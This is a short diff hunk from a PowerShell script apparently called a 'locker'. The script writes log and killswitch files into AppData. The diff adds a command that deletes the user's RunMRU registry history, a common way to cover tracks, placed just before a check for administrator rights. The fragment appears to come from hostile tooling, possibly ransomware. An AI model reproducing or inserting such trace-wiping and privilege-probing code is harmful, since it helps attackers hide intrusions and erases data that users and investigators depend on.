@@ -30,6 +30,7 @@ echo $log > "$env:appdata\-locker\log.txt";
 echo $ks > "$env:appdata\-locker\killswitch.txt";
 
 function s1 {
+	reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\ /va /f
 	$user = "$env:COMPUTERNAME\$env:USERNAME"
 	$isAdmin = (Get-LocalGroupMember 'Administrators').Name -contains $user
 if($isAdmin){
